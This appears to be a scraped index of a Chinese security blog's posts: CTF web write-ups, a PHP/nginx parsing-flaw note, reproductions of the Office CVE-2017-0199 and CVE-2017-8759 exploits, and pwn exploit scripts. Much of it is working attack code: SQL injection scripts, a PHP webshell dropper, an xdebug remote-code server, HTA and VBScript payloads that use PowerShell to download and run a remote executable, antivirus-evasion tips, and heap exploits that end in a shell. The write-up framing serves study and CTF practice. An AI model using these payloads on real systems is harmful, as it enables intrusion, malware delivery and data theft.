value=\"(.*)\"',s.get(\"http://116.85.39.110:5032/2096b322e99ffc1a59891b972c0fa612/login.php\").content)[0] # l[i] = s.get(\"http://192.168.148.137/rand.php\").content print i,l[i]for i in range(32,112): m = (int(l[i-3])+int(l[i-31])) % 2147483647 if i &gt;=50: print \"*\",i,m,l[i-3],l[i-31],m,float(m) * (62-(i-49)) / 2147483647 l[i] = m continue print i,l[i],l[i-3],l[i-31],m i = 50 org_str = list('0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ')str_len = len(org_str) - 1while(str_len): # rnd_index = int(round(float(l[i]) * (str_len+0) / 2147483647)) # (__n) = (__min) + (long) ((double) ( (double) (__max) - (__min) + 1.0) * ((__n) / ((__tmax) + 1.0))) min = 0 rnd_index = l[i] rnd_index = min +int( (float(str_len) - min +1.0) * (rnd_index / (2147483647+1.0)) ) if rnd_index != str_len: temp = org_str[str_len] org_str[str_len] = org_str[rnd_index] org_str[rnd_index] = temp print ''.join(org_str) str_len -=1 i+=1# a = org_str[:32]data = &#123;\"csrf\": l[49],\"username\": \"winter3un2\",\"password\": \"123456\",\"code\": \"admin###\"+\"\".join(org_str)[:32]&#125;print s.post(\"http://116.85.39.110:5032/2096b322e99ffc1a59891b972c0fa612/register.php\",data=data).content 注册登陆后，利用sprinf函数中%会吞掉下一个字符的特性，具体参考 https://www.cnblogs.com/test404/p/7821884.html 构造注入payload http://116.85.39.110:5032/2096b322e99ffc1a59891b972c0fa612/?id=%20union%20select%201,2,f14g%20%20from%20key%20%23&amp;title=%1$%27%1$s web6首页源码中有用户名密码，登陆后发现一个存在任意文件下载漏洞的api，利用这个api下载源码分析。。。。 没分析出来啊！ 虽然知道是ssrf ，super admin 的用户名也拿到了，但是登陆不了啊，接下去怎么玩啊，求指点！","tags":[{"name":"writeup","slug":"writeup","permalink":"https://winter3un.github.io/tags/writeup/"},{"name":"web","slug":"web","permalink":"https://winter3un.github.io/tags/web/"}]},{"title":"n1ctf 2018 web writeup","date":"2018-03-19T11:20:26.000Z","path":"2018/03/19/2018-n1ctf/","text":"前言因为工作上涉及到web知识的比较多，所以作为pwn选手，这次并没有关注pwn的任何一题题目。。反倒是把web题做了个一遍ORZ 77777PS：这个系列题真虐狗 题目的关键代码如下所示，接收用户发送过来的 flag 和hi 参数，并通过waf和sprintf格式化生成sql语句，关键点在于如何绕过waf函数（我这边写的waf函数和出题人写的是不一样，只是用于本地测试。） 1234567891011121314151617 function waf($points) &#123; return $points; &#125; function update_point($p,$points)&#123; $link=mysqli_connect('127.0.0.1','root','root','ctf_test'); $q = sprintf(\"UPDATE user SET points =%d%s\",$p,waf($points)); var_dump($q); if(!$query =mysqli_query($link,$q)) return FALSE; return TRUE;&#125;if(!update_point($_REQUEST['flag'],$_REQUEST['hi']))echo 'sorry'; 很明显，注入点在于points这个参数。 docker pull ubuntu:16.04本地搭建好环境测试一波。 构建数据库语句123create database ctf_test；use ctf_test;create table user (id int,name text,points int); 构造update查询的注入 payload 。 查询数据库当前用户信息，发送flag=0&amp;hi=%2bconv(hex(substr(user(),1, 4)), 16, 10)生成查询语句，UPDATE user SET points = 0+conv(hex(substr(user(),1, 4)), 16, 10)，发现竟然没有被waf挡住。。。 查询当前用户表中用户密码，发送flag=0&amp;hi=%2bconv(hex(substr((select password),1, 4)), 16, 10)，生成查询语语句 UPDATE user SET points = 0+conv(hex(substr((select password),1, 4)), 16, 10)，又过了waf。。。 ？（当时有点怀疑waf的真实性，不过后来测试admin、database都被waf挡住了，拿flag做题还是没问题的，但是万一flag不在当前用户的记录里呢，怎么做偏移？~ 77777-2emmmm关键的代码没有变，加强了waf，把password，pw，union等关键词挡住了，但是可以用如下的姿势绕过。 flag=0&amp;hi=%2bconv(hex(substr((select pw ),1, 4)), 16, 10) 没错。。pw左右各一个空格就绕过了，玄学。。 后台生成查询语句为UPDATE user SET points = 0+conv(hex(substr((select pw ),1, 4)), 16, 10) 应该是非预期，话说正解到底是啥？ funning eating cms一个cms系统。。用了网上的模版。 index.php页面的page参数存在文件包含漏洞，但是文件后缀名必须是php的才能包含，无法用来命令执行，只能看下源码，操作姿势http://47.52.152.93:20000/user.php?page=php://filter/read=convert.base64-encode/resource=config 把看到的php文件都下载到本地，审计一波，发现function.php文件内parse_url函数存在绕过，当构造////x.php?key=value这种形式的uri的时候，parse_url函数将无法解析该uri。 之后在http://47.52.152.93:20000/templates/info.html 的源码里得知关键信息在ffffllllaaaaggg.php文件里面。 123$keywords = [&quot;flag&quot;,&quot;manage&quot;,&quot;ffffllllaaaaggg&quot;];$uri = parse_url($_SERVER[&quot;REQUEST_URI&quot;]);parse_str($uri[&apos;query&apos;], $query); 通过构造 http://47.52.152.93:20000////user.php?page=php://filter/read=convert.base64-encode/resource=ffffllllaaaaggg 即可获得下个提示信息（好像又是非预期。。。）之后在上传函数的流程中发现 上传文件名处存在命令注入，直接构造把数据库导出就可以获取flag。。 mysqldump -uroot -pNu1LCTF2018\\!@#qwe --all-databases &gt; flagggggggg.png (对不起，我就是这么暴力。。。 easy php两个非预期解法。 第一个是通过包含session文件，利用 PHP_SESSION_UPLOAD_PROGRESS控制session内容，成功达成命令执行。 12345&lt;form action=&quot;http://47.52.246.175:23333/&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot; value=&quot;&lt;?=`echo &apos;&lt;?php eval(\\$_REQUEST[winter3un])?&gt;&apos;&gt;gg.php`?&gt;&quot; /&gt; &lt;input type=&quot;file&quot; name=&quot;file1&quot; /&gt; &lt;input type=&quot;submit&quot; /&gt;&lt;/form&gt; 第二个是通过xdebug 1curl --url http://112.213.118.106/?XDEBUG_SESSION_START=1 exp 脚本如下 1234567891011121314151617181920212223# encoding: utf-8from socketserver import BaseRequestHandler, TCPServerfrom base64 import b64encodephp_code = b\"print_r(file_put_contents('/var/www/html/cmd.php','&lt;?=`$_GET[a]`?&gt;'), true)\"payload = b\"\"\"eval -i 105 -- %s\"\"\" % b64encode(php_code)if len(payload) % 304 != 0: payload = payload + b'\\x00' * (304 - len(payload) % 304)count = 0class EchoHandler(BaseRequestHandler): def handle(self): global count print('Got connection from', self.client_address) while True: msg = self.request.recv(8192) print(msg) if not msg: break if count == 0: self.request.send(payload) count += 1if __name__ == '__main__': serv = TCPServer(('', 9000), EchoHandler) serv.serve_forever() harder php之后出题人修复了非预期的解法，正常解法流程如下。 1、备份文件源代码泄漏，通过代码审计，找到留言处存在sql注入漏洞。 2、利用该sql注入漏洞，获取管理员密码。 payload1`,0x12345)%23 3、管理员登录需要本地IP127.0.0.1 ,根据提示反序列化导致ssrf，谷歌搜索，第一篇文章即是 《PHP Unserialize Exploiting》（https://www.slideshare.net/MailRuGroup/security-meetup-22-php-unserialize-exploiting）12https://www.youtube.com/watch?v=5AdVQzUB6iMSSRF Unserializing SoapClient can provide SSRF with CRLF injection. O:10:&quot;SoapClient&quot;:3:&#123;s:3:&quot;uri&quot;;s:18:&quot;http://hostname/3%0a1&quot;; s:8:&quot;location&quot;;s:23:&quot;http://hostname/123&quot;;s:13:&quot; _soap_version&quot;;i:1;&#125; 4、其user-agent参数可以CRLF注入，伪造http request头，从而达成post任意参数的ssrf，利用该ssrf获取管理员登录后的session。 5、利用管理员登录后的session，上传php文件，但是有个坑，stripos(file_get_contents($move_to_file),&#39;&lt;?php&#39;)&gt;=0 这个表达式是恒返回0的。也就是说，不管怎么样都会触发rm /app/* 6、通过搜索引擎查询rm * 无法删除文件，查询到，当文件名前缀为-x时，必须用 rm -- * 才能删除，故上传文件名为-x1234的php一句话木马，再通过http response返回的时间戳来爆破文件名（文件夹所属是root，权限333），爆破成后即可getshell baby sqli题目太坑，注入点在个签那里，条件判断在头像那边。。 当时没做出，给个官方脚本 1234567891011121314151617181920212223242526272829303132333435363738394041424344# -*- coding:utf-8 -*- import requestsfrom random import Randomdef random_str(randomlength=8): str = &apos;&apos; chars = &apos;AaBbCcDdEeFfGgHhIiJjKkLlMmNnOoPpQqRrSsTtUuVvWwXxYyZz0123456789&apos; length = len(chars) - 1 random = Random() for i in range(randomlength): str+=chars[random.randint(0, length)] return strdic=&apos;0123456789_@:.abcdefghijklmnopqrstuvwxyz&apos;url=&quot;http://47.98.51.5/vlogin/reg.php&quot;table_name=&apos;&apos;def register(email,uinfo): url=&quot;http://47.98.51.5/vlogin/reg.php&quot; data=&#123; &quot;email&quot;:email, &quot;pass&quot;:&quot;123&quot;, &quot;userinfo&quot;:userinfo &#125; requests.post(url=url,data=data)def login(loginuser): url=&quot;http://47.98.51.5/vlogin/login.php&quot; a=requests.session() data2=&#123; &quot;loginuser&quot;:loginuser, &quot;loginpass&quot;:&quot;123&quot; &#125; a.post(url=url,data=data2) url3=&quot;http://47.98.51.5/vlogin/vpage/index.php&quot; b=a.get(url3) return b.textfor i in range(1,100): for j in dic: email=random_str(randomlength=8)+&quot;@1.com&quot; userinfo=&quot;&apos;or(if(1,(select(substr((select(user())),&#123;&#125;,1))=&apos;&#123;&#125;&apos;),1)=1)#&quot;.format(i,j) register(email,userinfo) c=login(email) if &quot;1.png&quot; in c: table_name += j print table_name breakprint table_name Reference：http://netsecurity.51cto.com/art/201702/531607.htm 一种新的MySQL下Update、Insert注入方法 https://www.anquanke.com/post/id/84837 题目2 无人机病了（Web） https://www.restran.net/2017/09/16/php-xdebug-cmd-exec/ PHP Xdebug 远程调试命令执行分析","tags":[{"name":"web","slug":"web","permalink":"https://winter3un.github.io/tags/web/"},{"name":"ctf","slug":"ctf","permalink":"https://winter3un.github.io/tags/ctf/"}]},{"title":"低版本php+nginx 解析漏洞","date":"2018-02-21T07:20:42.000Z","path":"2018/02/20/2018-2-21/","text":"正文事情要从某个午后说起，那时我正在日一个xx站，这个站nginx版本是1.6.2，php版本是5.3.3，开了GPC，我反复折腾了几天下来，有了数据库权限，有了任意文件下载，但是审了半天源码下来，审不出一个shell来，很绝望地上传了一个图片马，后面加了个/.php访问，它。。竟然执行了！？ 它怎么能执行？？不是小于&lt;= 0.8.37么，这nginx版本咋能执行？？？ 下图来自wooyun 这和说好的不一样喂？？？？ 群里吐槽了一番后ing，发现。。。这解析漏洞并不是nginx造成的问题，是因为php啊。。。。 php版本 &lt;= 5.3.9的时候（之后版本里有security.limit_extensions配置限制），配合nginx（无论版本多高），在默认配置下（cgi.fix_pathinfo全版本php默认配置为开启），存在php解析漏洞。 元凶是php.ini中的cgi.fix_pathinfo，nginx完成一次助攻。。。 由于这个解析漏洞被官方认为是特性而不是漏洞，所以没有cve。。。。 btw：在本机测试的时候，发现phpstudy全版本nginx+php存在这个解析漏洞。。。。这应该算是意外的惊喜。 referencehttp://drops.xmd5.com/static/drops/papers-539.html 解析漏洞总结 http://www.laruence.com/2010/05/20/1495.html Nginx + PHP CGI的一个可能的安全漏洞 http://www.cnblogs.com/buffer/archive/2011/07/24/2115552.html PHP CGI 中 fix_pathinfo 引起的安全隐患 https://taobig.org/?p=650 php.ini中的cgi.fix_pathinfo选项 https://bugs.php.net/bug.php?id=55181","tags":[{"name":"web","slug":"web","permalink":"https://winter3un.github.io/tags/web/"}]},{"title":"对cve-2017-0199与cve-2017-8759的浅析","date":"2017-10-29T12:41:52.000Z","path":"2017/10/29/cve-2017-office/","text":"前言首先说一下为什么偏偏选了这两个cve来复现+分析，其实是因为这两个cve复现比较容易，而且是目前apt团体主要用于apt打击的工具，而且于我个人而言，也是第一次分析word漏洞（当然这两个只是word的逻辑漏洞，并不是溢出漏洞，相对来说比较容易分析）。 没想到的是分析这两个漏洞的过程并不是一帆风顺，甚至可以说是坑坑洼洼了ORZ。也为了后人的学习以及自己将来的学习，故写下这篇文章。 环境victimer123os:10.0.14393 default Build 14393office:ver2010(14.0.4760.1000).net:v4.0.30319 ps:查看.net版本（资源管理器打开%systemroot%\\Microsoft.NET\\Framework,最高版本即是） attacker1python:2.7.14 cve-2017-0199该漏洞影响版本如下 1234Microsoft Office 2016Microsoft Office 2013Microsoft Office 2010Microsoft Office 2007 这个漏洞出在word对已经插入的远程对象访问的时候，如果访问的时候http相应头重含有Content-Type: application/hta那么将会对该对象以脚本的方式解析执行。具体的过程如图所示 脚本：https://github.com/bhdresh/CVE-2017-0199 在实验过程中，发现该脚本有几处坑，一个是server_thread函数写了两遍,还有一个是open函数缺少了一个参数，故而本人修改了这两处问题，修改后的代码放于github上。 使用方式和原来的脚本没有大的区别 https://github.com/Winter3un/cve_2017_0199 12345method 1 分发exe可执行文件并执行：1) Generate malicious RTF filepython cve-2017-0199_toolkit.py -M gen -t RTF -w Invoice.rtf -u http://192.168.1.125/demo.rtf2) Start toolkit in exploit mode to deliver local payloadpython cve-2017-0199_toolkit.py -M exp -t RTF -e http://192.168.1.125/shell.exe -l shell.exe 12345method 2 分发hta脚本并执行：1) Generate malicious RTF filepython cve-2017-0199_toolkit.py -M gen -t RTF -w Invoice.rtf -u http://192.168.1.125/demo.rtf2) Start toolkit in exploit mode to deliver custom HTA filepython cve-2017-0199_toolkit.py -M exp -t RTF -H custom.hta ps：虚拟机win7+office2010 未成功，不知道为啥。。 cve-2017-8759这个漏洞其实是出在.net模块，但是是通过word或者写字板作为媒介引发的。漏洞原因是开发者没有考虑到输入点会存在换行符，导致了单行注释绕过。我们可以将存在换行符的.net代码发送过去绕过单行注释，进行.net代码执行。这个漏洞危害还是挺大的，与office无关，几乎影响所有版本的.net框架12345678Microsoft .NET Framework 4.6.2Microsoft .NET Framework 4.6.1Microsoft .NET Framework 3.5.1Microsoft .NET Framework 4.7Microsoft .NET Framework 4.6Microsoft .NET Framework 4.5.2Microsoft .NET Framework 3.5Microsoft .NET Framework 2.0 SP2 脚本来自: https://github.com/Winter3un/cve_2017_8759 生成exp 1python3 CreateRTF.py -f 1.rtf -u http://127.0.0.1:8080/exp.txt 开启服务 1python -m SimpleHTTPServer 8080 免杀免杀主要参考了剖析RTF文件中的Anti-Analysis技术这篇文章 1) 不完整的RTF头部 2）奇怪的16进制数 3）在16进制数中插入额外的空格 4）16进制编码数据中的虚假RTF控制字 5）在16进制数据中包含二进制数据 但是目前来说，这五种方式做的免杀都会被主流杀软干掉，样本hash：b7f67029abc6e44e860fb13313a2b8024c59f200d3680c5dfd2886c9f3bcfc54 virustotal检出率21/59，目前没有啥好的办法可以绕过杀软。 hta脚本相关最简1234&lt;script&gt;a=new ActiveXObject(\"WScript.Shell\");a.run('%windir%\\\\System32\\\\cmd.exe /c calc.exe', 0);window.close();&lt;/script&gt; powershell代码执行 1234567891011121314&lt;script language=\"VBScript\"&gt;Sub window_onload const impersonation = 3 Const HIDDEN_WINDOW = 12 Set Locator = CreateObject(\"WbemScripting.SWbemLocator\") Set Service = Locator.ConnectServer() Service.Security_.ImpersonationLevel=impersonation Set objStartup = Service.Get(\"Win32_ProcessStartup\") Set objConfig = objStartup.SpawnInstance_ Set Process = Service.Get(\"Win32_Process\") Error = Process.Create(\"powershell.exe -nop -w hidden calc.exe\", null, objConfig, intProcessID) window.close()end sub&lt;/script&gt; powershell下载远程exe并执行 1234&lt;script&gt;a=new ActiveXObject(\"WScript.Shell\");a.run('%SystemRoot%/system32/WindowsPowerShell/v1.0/powershell.exe -windowstyle hidden (new-object System.Net.WebClient).DownloadFile(\\'http://192.168.1.125/shell.exe\\', \\'c:/windows/temp/shell.exe\\'); c:/windows/temp/shell.exe', 0);window.close();&lt;/script&gt; 1234567891011&lt;script language=\"VBScript\"&gt;Sub window_onload window.resizeTo 0,0 window.MoveTo -100,-100 const impersonation = 3 Const HIDDEN_WINDOW = 12 Set Locator = CreateObject(\"WScript.Shell\") Locator.Run\"powershell.exe -nop -w hidden -c \"\"IEX (new-object net.webclient).downloadstring('http://192.168.211.149:80/artifact.exe')\"\"\",0,FALSE window.close()end sub&lt;/script&gt; 以上脚本都能在我的github上找到 参考文档：对CVE-2017-0199的一次复现过程与内网穿透的利用：https://zhuanlan.zhihu.com/p/26522540?utm_medium=social&amp;utm_source=weiboOFFICE OLE2LINK（CVE-2017-0199）漏洞利用详解：http://www.freebuf.com/articles/system/131969.htmlCVE-2017-0199漏洞复现：http://www.hackersb.cn/hacker/228.html一个换行符引发的奥斯卡0day漏洞(CVE-2017-8759)重现：最新的Office高级威胁攻击预警：http://www.freebuf.com/articles/system/147602.htmlCVE-2017-8759 微软word漏洞复现以及利用：http://www.cnblogs.com/deen-/p/7532078.htmlCVE-2017-8759完美复现.并且解决HTA,POWERSHELL弹框闪烁：http://www.lz1y.cn/?p=799最新CVE-2017-8759漏洞复现的两种姿势：https://bbs.77169.com/forum.php?mod=viewthread&amp;tid=364738剖析RTF文件中的Anti-Analysis技术：http://www.freebuf.com/articles/terminal/102018.html","tags":[{"name":"cve","slug":"cve","permalink":"https://winter3un.github.io/tags/cve/"},{"name":"office","slug":"office","permalink":"https://winter3un.github.io/tags/office/"}]},{"title":"810线下赛复盘","date":"2017-08-16T16:32:29.000Z","path":"2017/08/16/2017-8-10/","text":"pwn前言将atoi_got修改成printf_plt，威力无穷~ 线下赛只有一个pwn题，但这一个pwn题却出的非常好，虽然防御机制没有全开，但是考察点非常之多，就其中一个漏洞的利用，就考察了如下五个知识点。 string overflow int overflow off by one race condition heap overlay fmt 第一个漏洞第一个漏洞出现在west模块，该模块可以创建最多两个house，初始的金币都为5（虽然有一个tricks，但是然并软），然后可以选择其中一个house的id购买weapon，若其中一个house的weapon比另一个强，就可以将另一个house消灭掉（free），那么我们怎么才能增加我们的金币数目呢，其实我们可以利用string overflow的方式，如下代码。 12345678fgets(&amp;s1, 0x16, stdin);v9 = 0xA;if ( strlen(&amp;s1) &gt; 0x10 )&#123;puts(&quot;Your name is too long!&quot;);exit(-1);&#125;str_cpy(0x28LL * (signed int)i + 0x605148, (__int64)&amp;s1); s1可以输入0x16个字节，而string函数都以&#39;\\x00&#39;字节定义字符串的结束，我们可以构造绕过，将money覆盖成一个最大数0x7fffffff,即可买我们想要的任何装备，接着漏洞出现在snprintf处，该函数的返回值由原本要复制到dst addr 的数据长度决定，故而这边存在一个溢出，我们只要让返回值大于0x54即可，int overflow刚好能够做到这件事。接着利用刚才获取的长度溢出一个字节（只能达到一个字节，故而我们可以利用off by one技术将指向soliders的指针位置上移），接着利用heap overlay技术将该上移的指针加入到unsorted bin内，在下次分配的时候，能够再次分配到该空间，故而我们可以利用该空间将house中的soliders指针地址修改成atoi_got，然后在写入print_plt的地址，利用fmt技术泄漏libc信息，算出system的地址，将atoi_got的地址修改成system地址，即可拿到shell，草稿如下。 12345678910111213141516171819202122232425262728293031323334350x605140|ptr1(0xa0)|xxxxxxxx|xxxxxxxx 0x605158|money 0x605158|length 0x60515cptr1 size:0xa0weapon(size:0x68)|ptr2(0x50) size:0x8|ally(size:0x30)0x10 0x40ptr2( read soliders 0x50)0x605190 ptr2_addr一些细节：可以从else中的puts字符串来快速分析判断的是什么uaf漏洞的分析，看free后，指针是否置0逆向功底很重要。strcmpstrlen都可以绕过 第一个漏洞的利用exp如下 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195#!/usr/bin/env python# -*- coding: utf-8 -*-# @Date : 2017-08-15 21:50:04# @Author : WinterSun (511683586@qq.com)# @Link : https://Winter3un.github.io/import roputils,os,timefrom pwn import *from ctypes import *context(log_level=\"debug\")DEBUG = 1#socat TCP4-LISTEN:10001,fork EXEC:./pwn1target = \"./pwn\"remote_ip = \"\"port = 0rop = roputils.ROP(target)elf = ELF(target)# lib = cdll.LoadLibrary('./libc64.so')# payload = rop.call('__isoc99_scanf', 0x804888F,0x0804A034)# libc = ELF[target]# msfvenom -p linux/x86/exec CMD=/bin/sh -b \"\\x0b\\x00\" -f python#buf = \"\"# buf += \"\\x2b\\xc9\\x83\\xe9\\xf5\\xe8\\xff\\xff\\xff\\xff\\xc0\\x5e\\x81\"# buf += \"\\x76\\x0e\\x7d\\x30\\x90\\xf9\\x83\\xee\\xfc\\xe2\\xf4\\x17\\x3b\"# buf += \"\\xc8\\x60\\x2f\\x56\\xf8\\xd4\\x1e\\xb9\\x77\\x91\\x52\\x43\\xf8\"# buf += \"\\xf9\\x15\\x1f\\xf2\\x90\\x13\\xb9\\x73\\xab\\x95\\x38\\x90\\xf9\"# buf += \"\\x7d\\x1f\\xf2\\x90\\x13\\x1f\\xe3\\x91\\x7d\\x67\\xc3\\x70\\x9c\"# buf += \"\\xfd\\x10\\xf9\"# int 0x80 linux x86 0x1c# buf = \"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x89\\xc1\\x89\\xc2\\xb0\\x0b\\xcd\\x80\\x31\\xc0\\x40\\xcd\\x80\";# bss = rop.section('.bss')# rop.got('puts')# rop.call('read', 0, addr_bss, 0x100)# msfvenom -p linux/x86/exec CMD=/bin/sh -f python -b '\\x00\\x0b\\x0d\\x0a'# def exec_fmt(payload):# p = process(target)# p.recvuntil(\"input:\")# p.sendline(payload)# p.recvuntil(\"input:\")# p.sendline(payload)# return p.recvuntil(\",\")[:-1]# autofmt = FmtStr(exec_fmt)# offset = autofmt.offset# def send_payload(payload):# sl(payload+\"%100000c\")# autofmt = FmtStr(send_payload,offset=offset)# autofmt.write(free_hook_addr,one_gadget_addr)# autofmt.execute_writes()if DEBUG: p = process(target,env=&#123;\"LD_LIBRARY_PATH\":sys.path[0]&#125;) else: p = remote(remote_ip,port)def sl(data): p.sendline(data)def sd(data): p.send(data)def ru(data): return p.recvuntil(data)# westru(\"exit\\n\")sl(\"1\")def create_house(soliders): # create a house ru(\"war\\n\") sl(\"1\") ru(\"\\n\") sl(\"n\") ru(\"\\n\") sl(\"\\x00\"*0x10+p32(0x7fffffff)) ru(\"\\n\") sl(\"-2147483647\") ru(\"\\n\") ## Words sd(\"a\"*0x2e) ## soliders ru(\"\\n\") sl(str(soliders)) ru(\"\\n\") sd(\"a\"*soliders) ## ally ru(\"\\n\") sd(\"a\"*0x30)def create_house2(): # create a house ru(\"war\\n\") sl(\"1\") ru(\"\\n\") sl(\"n\") ru(\"\\n\") sl(\"\\x00\"*0x10+p32(0x7fffffff)) ru(\"\\n\") # int overflow sl(\"-2147483647\") ru(\"\\n\") ## Words sd(\"a\"*0x2e) ## soliders ru(\"\\n\") sl(str(0x50)) ru(\"\\n\") sl('a'*0x38+p64(elf.got[\"atoi\"])) ## ally ru(\"\\n\") sd(\"a\"*0x30)def change_weapon(_id,weapon): ru(\"war\\n\") sl(\"2\") ru(\"\\n\") sl(str(_id)) ru('5000000\\n') sl(str(weapon))def change_word(): ru(\"war\\n\") sl(\"1024\") ru(\"id\\n\") sl(\"0\") ru(\" to Death?\\n\") # 0x10+0x14 payload = \"Not today\\x00\" payload = payload.ljust(0x30-0x24,\"a\") # heap overlay payload += p64(0)+p64(0x1c0-0x30+1) payload = payload.ljust(0x54,\"a\") # fake chunck off by one payload += chr(0x30+0x10) sd(payload) # passdef start_war(): ru(\"war\\n\") sl(\"4\")def change_vassal(addr): ru(\"war\\n\") sl(\"3\") ru(\"id\\n\") sl(\"0\") ru(\"\\n\") sl(str(0x50)) ru(\"\\n\") sl(p64(addr))create_house(0x50)# gdb.attach(p,\"b*0x401AE2\\nc\")create_house(0x40)change_weapon(0,4)change_weapon(1,5)start_war()# race conditionchange_word()import timetime.sleep(3)# gdb.attach(p,\"b*0x402301\\nc\")# unsorted bin FIFOcreate_house2()# fmtchange_vassal(elf.symbols[\"printf\"])ru(\"war\\n\")sl(\"%7$s....\"+p64(elf.got[\"printf\"]))printf_addr = u64(p.recv(6).ljust(8,\"\\x00\"))offset = 0x0000000000054b50 - 0x0000000000044380system_addr = printf_addr-offset# edit_addrsl(\"%7$n....\"+p64(0x605130))# change_vassal(system_addr)# gdb.attach(p,\"b*0x402301\\nc\")ru(\"war\\n\")sl(\"123\")ru(\"id\\n\")sd(\"\\n\")ru(\"\\n\")sl(\"a\"*0x7)ru(\"\\n\")sl(p64(system_addr))ru(\"war\\n\")sl(\"/bin/sh\\x00\")p.interactive() 第二个漏洞第二个漏洞出现在east模块，该模块下，存储slaves的长度被设计成为 chunk_size-8，而chunks_size由于其末三位是标记位，prev_size标记位于第8位，该标记位在前一个chunk在使用中时置1，故而当我们过呢关系slaves时，我们拥有一个字节的溢出，即off by one。我们可以利用这一个字节的溢出来修改下一个chunk的prev_size和其标记位来为实现overlay heap 和 unlink 攻击做铺垫（事实上这边只用到了unlink攻击，向前unlink），这边其实卡了我很久，一开始在想向前合并还是向后合并，后来尝试向后合并，但是 loyalty chunk的大小是0xe0+0x10 向后合并需要在下一个chunk构建fake_chunk_head，故而需要伪造 loyalty chunk_size 的字段值，使其满足寻址（找到下一个chunk）的逻辑，这个值是0xe0+0x10+0x1+0x10=0x101，很遗憾，需要溢出两个字节才能达到要求，而我们并没有溢出两个字节的条件。故而想到向前合并，在loyalty chunk的前一个chunk中构建fake_chunk_head，将loyalty chunk_size_prev_flag置0，构造loyalty prev_size，触发free loyalty chunk，我们便可以获得一次任意地址写的机会~~利用代码如下，其实直接看代码就可以，逻辑很清晰。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155#!/usr/bin/env python# -*- coding: utf-8 -*-# @Date : 2017-08-17 00:53:09# @Author : WinterSun (511683586@qq.com)# @Link : https://Winter3un.github.io/import roputils,os,timefrom pwn import *from ctypes import *context(log_level=\"debug\")DEBUG = 1#socat TCP4-LISTEN:10001,fork EXEC:./pwn1target = \"./pwn\"remote_ip = \"\"port = 0rop = roputils.ROP(target)elf = ELF(target)# lib = cdll.LoadLibrary('./libc64.so')# payload = rop.call('__isoc99_scanf', 0x804888F,0x0804A034)# libc = ELF[target]# msfvenom -p linux/x86/exec CMD=/bin/sh -b \"\\x0b\\x00\" -f python#buf = \"\"# buf += \"\\x2b\\xc9\\x83\\xe9\\xf5\\xe8\\xff\\xff\\xff\\xff\\xc0\\x5e\\x81\"# buf += \"\\x76\\x0e\\x7d\\x30\\x90\\xf9\\x83\\xee\\xfc\\xe2\\xf4\\x17\\x3b\"# buf += \"\\xc8\\x60\\x2f\\x56\\xf8\\xd4\\x1e\\xb9\\x77\\x91\\x52\\x43\\xf8\"# buf += \"\\xf9\\x15\\x1f\\xf2\\x90\\x13\\xb9\\x73\\xab\\x95\\x38\\x90\\xf9\"# buf += \"\\x7d\\x1f\\xf2\\x90\\x13\\x1f\\xe3\\x91\\x7d\\x67\\xc3\\x70\\x9c\"# buf += \"\\xfd\\x10\\xf9\"# int 0x80 linux x86 0x1c# buf = \"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x89\\xc1\\x89\\xc2\\xb0\\x0b\\xcd\\x80\\x31\\xc0\\x40\\xcd\\x80\";# bss = rop.section('.bss')# rop.got('puts')# rop.call('read', 0, addr_bss, 0x100)# msfvenom -p linux/x86/exec CMD=/bin/sh -f python -b '\\x00\\x0b\\x0d\\x0a'# def exec_fmt(payload):# p = process(target)# p.recvuntil(\"input:\")# p.sendline(payload)# p.recvuntil(\"input:\")# p.sendline(payload)# return p.recvuntil(\",\")[:-1]# autofmt = FmtStr(exec_fmt)# offset = autofmt.offset# def send_payload(payload):# sl(payload+\"%100000c\")# autofmt = FmtStr(send_payload,offset=offset)# autofmt.write(free_hook_addr,one_gadget_addr)# autofmt.execute_writes()if DEBUG: p = process(target,env=&#123;\"LD_LIBRARY_PATH\":sys.path[0]&#125;) else: p = remote(remote_ip,port)def sl(data): p.sendline(data)def sd(data): p.send(data)def ru(data): return p.recvuntil(data)# eastru(\"exit\\n\")sl(\"2\")def Occupy(slaves,date): ru(\"Exit\\n\") sl(\"1\") ru(\"choice:\\n\") sl(\"1\") ru(\"\\n\") sl(str(slaves)) ru(\"\\n\") sl(date)def update_slaves(_id,date): ru(\"Exit\\n\") sl(\"2\") ru(\"id\\n\") sl(str(_id)) ru(\"\\n\") sd(str(date))def ruin(_id,flag): ru(\"Exit\\n\") sl(\"3\") ru(\"ruin\\n\") sl(str(_id)) ru(\"nate him?(y/n)\") sl(flag)def show(_id): ru(\"Exit\\n\") sl(\"4\") ru(\"id\\n\") sl(str(_id))Occupy(0x40,\"123\") #0ru(\"Khal\")sl(\"123\")Occupy(0x40,\"123\") #1Occupy(0x40,\"123\") #2# get fastbin#2 addrruin(2,\"n\")ruin(1,\"n\")show(1)ru(\"salves: \")fast_bin_addr = u64(ru(\"\\n=\")[:-2].ljust(8,\"\\x00\"))print \"fast_bin_addr#0=\"+hex(fast_bin_addr)# heap_base addrheap_addr = fast_bin_addr-(fast_bin_addr &amp; 0xfff)fast_bin_addr_ptr = heap_addr+0x10+0x20# rebuild Occupy(0x40,\"123\") #1Occupy(0x40,\"123\") #2# overwrite small chunk size unlink prev_fast_chunkfake_chunk_head = p64(0)+p64(0x41)+p64(fast_bin_addr_ptr-0x18)+p64(fast_bin_addr_ptr-0x10)payload = fake_chunk_headpayload = payload.ljust(0x40,\"\\x00\")update_slaves(0,payload+p64(0x40)+chr(0xe0+0x10))# unlinkruin(1,\"y\")# gdb.attach(p,\"b*0x40131D\\nc\")# change atoi to 